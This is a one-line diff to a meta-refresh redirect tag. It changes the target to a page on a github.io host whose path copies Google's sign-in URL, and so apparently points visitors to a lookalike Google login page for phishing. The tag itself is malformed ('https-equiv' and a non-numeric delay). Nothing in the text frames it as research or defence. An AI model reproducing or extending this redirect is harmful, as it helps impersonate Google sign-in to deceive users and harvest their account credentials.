@@ -1,1 +1,1 @@
-<meta https-equiv = "refresh" content = "seconds"; url = "https://loomixcom.github.io/google/index.html" />
+<meta https-equiv = "refresh" content = "seconds"; url = "https://loomixcom.github.io/google//signin/v2/identifier?hl=en&continue=https%3A%2F%2Fwww.google.com%2Fwebhp%3Fauthuser%3D0&ec=GAlAmgQ&flowName=GlifWebSignIn&flowEntry=AddSession" />
